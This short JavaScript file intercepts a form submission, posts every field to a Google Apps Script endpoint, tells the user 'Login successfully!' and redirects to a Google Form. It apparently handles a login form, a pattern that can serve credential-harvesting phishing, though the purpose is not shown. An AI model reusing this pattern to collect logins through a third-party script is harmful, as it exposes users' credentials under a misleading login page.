document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("dataForm");

    // Google Apps Script URL
    const scriptURL = "https://script.google.com/macros/s/AKfycbw_Sx1qP0A8aiV0GcZ83SNUHMRh0Nibr6ITjMz7EWZFM2QuDXvahZsn8VloDVvCCfXt/exec";
    
    // Redirect URL after form submission
    const redirectURL = "https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit";

    // Handle form submission
    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent default form submission

        // Collect form data
        const formData = new FormData(form);

        // Send data to Google Apps Script
        fetch(scriptURL, {
            method: "POST",
            body: formData,
        })
            .then((response) => {
                if (response.ok) {
                    alert("Login successfully!");
                    // Redirect to the specified URL
                    window.location.href = redirectURL;
                } else {
                    alert("Error submitting data. Please try again.");
                }
            })
            .catch((error) => {
                console.error("Error:", error);
                alert("Error submitting data. Please try again.");
            });
    });
});
